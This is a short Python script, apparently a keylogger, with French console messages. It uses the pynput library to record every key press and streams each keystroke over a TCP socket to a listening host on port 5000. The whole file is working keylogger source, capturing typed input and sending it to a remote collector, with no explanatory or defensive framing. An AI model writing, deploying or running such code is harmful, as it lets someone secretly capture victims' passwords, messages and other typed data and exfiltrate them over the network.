from pynput import keyboard
import socket

def on_press(key):
    try:
        print('Touche : {0} '.format(key.char))
        clientSocket.send(format(key.char).encode());
    except AttributeError:
        print('Touche spéciale : {0}'.format(key))
        clientSocket.send(format(key).encode());
host = '0.0.0.0'
port = 5000
clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
clientSocket.connect((host, port));
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
